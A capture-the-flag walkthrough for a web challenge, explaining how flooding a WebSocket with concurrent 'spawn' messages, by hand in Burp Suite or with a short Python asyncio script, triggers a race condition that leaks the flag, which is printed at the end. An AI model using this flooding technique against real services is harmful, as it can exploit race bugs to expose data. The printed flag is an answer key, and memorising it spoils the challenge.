- **Name:** Waguri1
- **Category:** Web

## Description

The SPAWN button looks harmless, but there's something behind it. Can you find it out?

## Walkthrough

It's a race condition — multiple concurrent `spawn` requests cause the server to leak the flag.

### Method 1 — Burp Suite

Open Burp Suite, enable the WebSocket history interceptor. Open the target in browser. Click the SPAWN button to establish the WebSocket. In Burp's WebSocket history, send `{"type":"spawn"}` repeatedly in the WS message editor. After enough sends, the flag appears in one of the responses.

### Method 2 — Python script

```python
import asyncio
import websockets

TARGET = "wss://<target-url>/ws"

async def spam():
    async with websockets.connect(TARGET) as ws:
        tasks = []
        for _ in range(50):
            tasks.append(asyncio.create_task(ws.send('{"type":"spawn"}')))
        await asyncio.gather(*tasks)

        # collect responses
        for _ in range(50):
            try:
                msg = await asyncio.wait_for(ws.recv(), timeout=0.5)
                print(msg)
                if "LYKN" in msg or "flag" in msg.lower():
                    print("FLAG FOUND:", msg)
            except:
                break

asyncio.run(spam())
```

Same thing — fire many spawns concurrently. The race window opens, server slips the flag into a response.

### Flag

`LYKNCTF{95747b7f97f743bdbb02fd799617fb22}`
